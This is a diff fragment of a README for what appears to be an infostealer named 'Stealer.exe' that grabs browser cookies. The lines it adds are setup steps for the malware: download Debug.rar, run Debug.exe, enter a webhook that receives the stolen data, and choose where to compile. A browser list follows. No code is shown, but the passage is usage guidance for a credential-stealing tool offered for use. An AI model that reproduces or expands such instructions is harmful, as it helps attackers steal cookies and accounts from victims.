@@ -45,6 +45,12 @@ Stealer.exe COOKIES
   <img src="images/cookies.gif"/>
 </p>
 
+# Tutorial
+
+  1. Download the Debug.rar 
+  2. Execute `Debug.exe`
+  3. Enter your webhook
+  4. Select compiling location
 
 # :globe_with_meridians: Browsers list:
 * Google Chrome
